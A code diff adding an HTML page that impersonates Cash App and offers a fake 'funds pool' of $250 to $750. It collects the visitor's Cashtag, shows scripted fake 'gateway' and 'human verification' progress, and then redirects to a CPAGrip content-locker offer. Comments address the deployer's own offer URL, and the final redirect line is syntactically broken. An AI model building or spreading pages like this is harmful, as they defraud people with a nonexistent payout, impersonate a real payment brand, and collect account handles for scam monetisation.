@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cash App Reward Distribution</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0b0b0c;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+
+        .card {
+            background: #121214;
+            border: 1px solid #222226;
+            border-radius: 24px;
+            padding: 35px 25px;
+            max-width: 440px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+        }
+
+        /* Large Cash App Iconic Dollar Emblem */
+        .cash-logo {
+            color: #00D54B;
+            font-size: 56px;
+            font-weight: 300;
+            margin-bottom: 15px;
+            display: inline-block;
+            line-height: 1;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtext {
+            color: #99999f;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        /* Amount Selection Grid */
+        .amount-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .amount-card {
+            background: #1c1c1f;
+            border: 2px solid #2c2c30;
+            border-radius: 14px;
+            padding: 15px 10px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #00D54B;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .amount-card.active {
+            border-color: #00D54B;
+            background: rgba(0, 213, 75, 0.05);
+        }
+
+        /* Input Tag Area */
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        .input-prefix {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #66666c;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            background: #1c1c1f;
+            border: 1px solid #2c2c30;
+            padding: 16px 16px 16px 35px;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="text"]:focus {
+            border-color: #00D54B;
+        }
+
+        /* Dynamic Status Console */
+        .status-box {
+            background: #0b0b0c;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: left;
+            font-size: 13px;
+            display: none; /* Triggers via JS click */
+        }
+
+        .status-line {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #a1a1a6;
+            margin-bottom: 8px;
+        }
+
+        .status-line:last-child {
+            margin-bottom: 0;
+        }
+
+        .spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid #333;
+            border-top: 2px solid #00D54B;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+
+        .checkmark {
+            color: #00D54B;
+            font-weight: bold;
+        }
+
+        /* Green Cash App CTA Button */
+        .claim-btn {
+            display: block;
+            background: #00D54B;
+            color: #000000;
+            text-decoration: none;
+            font-size: 17px;
+            font-weight: 700;
+            padding: 16px;
+            border-radius: 30px; /* Rounded pill style */
+            transition: background 0.2s, transform 0.1s;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+        }
+
+        .claim-btn:hover {
+            background: #00bd42;
+        }
+
+        .claim-btn:active {
+            transform: scale(0.98);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="cash-logo">$</div>
+
+        <h1>Cash App Funds Pool</h1>
+        <p class="subtext">Select an open balance alternative pool and input your Cashtag to verify server connection.</p>
+
+        <div class="amount-container">
+            <div class="amount-card" onclick="selectAmount(this)">$250</div>
+            <div class="amount-card active" onclick="selectAmount(this)">$500</div>
+            <div class="amount-card" onclick="selectAmount(this)">$750</div>
+        </div>
+
+        <div class="input-group">
+            <span class="input-prefix">$</span>
+            <input type="text" id="cashtag" placeholder="Cashtag" autocomplete="off" required>
+        </div>
+
+        <div class="status-box" id="statusBox">
+            <div class="status-line" id="step1">
+                <span class="spinner" id="spin1"></span><span class="checkmark" id="check1" style="display:none;">✓</span> 
+                <span id="text1">Searching for secure gateway...</span>
+            </div>
+            <div class="status-line" id="step2" style="opacity: 0.4;">
+                <span class="spinner" id="spin2" style="display:none;"></span><span class="checkmark" id="check2" style="display:none;">✓</span> 
+                <span id="text2">Formatting allocation packet...</span>
+            </div>
+            <div class="status-line" id="step3" style="opacity: 0.4;">
+                <span class="spinner" id="spin3" style="display:none;"></span>
+                <span id="text3">Human verification required...</span>
+            </div>
+        </div>
+
+        <button id="actionBtn" class="claim-btn" onclick="startProcessing()">
+            Continue
+        </button>
+    </div>
+
+    <script>
+        // Toggle the grid active states
+        function selectAmount(element) {
+            document.querySelectorAll('.amount-card').forEach(card => card.classList.remove('active'));
+            element.classList.add('active');
+        }
+
+        // Custom script pipeline to build compliance commitment
+        function startProcessing() {
+            var tag = document.getElementById('cashtag').value.trim();
+            if(tag === "") {
+                alert("Please enter a valid Cashtag to proceed.");
+                return;
+            }
+
+            // Hide Input & Amount Selection elements to isolate focus on console status
+            document.getElementById('cashtag').blur();
+            document.getElementById('statusBox').style.display = "block";
+            document.getElementById('actionBtn').style.pointerEvents = "none";
+            document.getElementById('actionBtn').innerText = "Processing...";
+
+            // Stage 1 complete simulation
+            setTimeout(function() {
+                document.getElementById('spin1').style.display = "none";
+                document.getElementById('check1').style.display = "inline";
+                document.getElementById('text1').style.color = "#00D54B";
+                
+                // Advance to Step 2
+                document.getElementById('step2').style.opacity = "1";
+                document.getElementById('spin2').style.display = "inline-block";
+            }, 1800);
+
+            // Stage 2 complete simulation
+            setTimeout(function() {
+                document.getElementById('spin2').style.display = "none";
+                document.getElementById('check2').style.display = "inline";
+                document.getElementById('text2').style.color = "#00D54B";
+                
+                // Advance to Step 3
+                document.getElementById('step3').style.opacity = "1";
+                document.getElementById('spin3').style.display = "inline-block";
+            }, 3500);
+
+            // Final lock status change to force exit click redirect out to locker
+            setTimeout(function() {
+                // Change current button state directly to trigger your link destination
+                var btn = document.getElementById('actionBtn');
+                btn.innerText = "Verify & Complete Now";
+                btn.style.pointerEvents = "auto";
+                btn.style.background = "#ffffff";
+                btn.style.color = "#000000";
+                
+                // Update click action route directly to your exact CPAGrip offer URL
+                btn.onclick = function() {
+                    window.location.href = <script type="text/javascript" src="https://getafilenow.com/script_include.php?id=1896266"></script>;
+                };
+            }, 4800);
+        }
+    </script>
+
+</body>
+</html>
